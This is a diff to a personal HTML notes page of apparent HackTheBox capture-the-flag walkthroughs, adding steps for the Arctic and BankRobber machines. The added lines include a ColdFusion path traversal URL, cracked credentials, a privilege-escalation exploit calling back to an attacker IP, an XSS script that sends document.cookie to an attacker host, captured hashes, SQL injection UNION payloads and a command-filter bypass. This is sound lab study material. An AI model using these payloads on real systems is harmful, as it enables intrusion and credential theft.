@@ -156,6 +156,7 @@
             height: 100%;
             z-index: -1; /* Set z-index to ensure the particles appear behind other content */
         }
+        
     </style>
 
     <script>
@@ -296,6 +297,8 @@
     <header>
         <h2 class="glow"># joe95's Notes</h2>
         <br><span>last_update:Dec.14.2023</span>
+        <script src="displayVisitorInfo.js"></script>
+        <br><span id="visitorInfo"></span>
     </header>
 
     <main>
@@ -1914,25 +1917,43 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Arctic (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <span class="step_title">Initial_Foothold 1</span>
+                        <br>found tcp/8500 running 'ColdFusion 8' `searchsploit ColdFusion`
+                        <br>Adobe ColdFusion 8 - Remote Command Execution (RCE) /usr/share/exploitdb/exploits/cfm/webapps/50057.py
+                        <br><span class="step_title">Initial_Foothold 2</span>
+                        <br>http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+                        <br>found password hash 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 crack: happyday
+                        <br>and based on login page source code, it need a salted sha1 hash, and the salt is hidden in source code. Use browser dev tool to calculate the sha1 hash
+                        <br>hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03');
+                        <br>use burp to edit 'cfadminPassword=' value with the sha1 hash got logged in
+                        <br>https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File
+                        <br>go to 'Mappings' section upload a payload and set schedule to run it
+                        <br><span class="step_title">Privilege_escalation(tolis->system)</span>
+                        <br>`systeminfo` and save in kali as 'systeminfo'
+                        <br>`./windows-exploit-suggester.py --update` got 2023-08-07-mssb.xls
+                        <br>`./windows-exploit-suggester.py -i systeminfo -d 2023-08-07-mssb.xls` found many
+                        <br>[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+                        <br>https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe
+                        <br>`MS10-059.exe 10.10.14.26 9001`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>BankRobber (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="insane">BankRobber (Insane/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
+                        <br>register and login the E-coin page, submit a transfer shows the admin will review it, which leaks to XSS(Cross Site Scripting)
+                        <br>&lt;img src="10.10.14.5/test.jpg" /&gt; &lt;script src="http://10.10.14.5/test.js"&gt;&lt;/script&gt; python server only receive test.js
+                        <br>NoteL responder catched hash non-crakable: [SMBv2] NTLMv2-SSP Hash     : Cortin::BANKROBBER:8e03eb65c1ff7440:B6A365E18C306FF457C7B2E133E71AC6:0101000000000000C0653150DE09D201A9520A6CF259AB64000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000651BA4D76C8F5FB4DB2D21ED382782CB4FC0762AE6F5272B06ED51D958033E6C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
+                        <br>create the test.js  var request = new XMLHttpRequest();request.open('GET', 'http://10.10.14.5/?test='+document.cookie, true);request.send()
+                        <br>10.10.10.154 - - [13/Aug/2023 02:13:32] "GET /?cookies=dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== HTTP/1.1" 200 -
+                        <br>`echo -n dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ== | base64 -d` output: username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; id=1
+                        <br>`echo -n YWRtaW4= | base64 -d` admin `echo -n SG9wZWxlc3Nyb21hbnRpYw== | base64 -d` Hopelessromantic and login with admin:Hopelessromantic
+                        <br>SQL Injection in 'search users'
+                        <br>10' UNION SELECT user,password,3 from mysql.user;-- -
+                        <br>10' UNION SELECT 1,load_file('c:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3;-- -
+                        <br>$bad = array('$(','&'); $good = "ls";   which means we can use ';' or '|' to bypass filter
+                        <br>if($_SERVER['REMOTE_ADDR'] == "::1"){   which means it only run on local
+                        <br>XSS(Cross Site Scripting) + XSRF(Cross Site Request Forgery) to get shell
                         <br>
                         <br>
                         <br>
@@ -3049,7 +3070,7 @@
             </div>
         </div>
         <!-- ========================pico_ctf_content======================== -->
-        <h5>Currently Studying OSCP</h5>
+        <h5>I'm currently Studying OSCP</h5>
         <h5><span id="protectedEmail"></span></h5>
         <h5><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></h5>
         <h5>Certified: CCNP-RS | CCIE-Security</h5>
@@ -3067,4 +3088,3 @@
             })
             .catch(error => console.error('Error fetching particlesjs-config.json:', error));
     </script>
-   
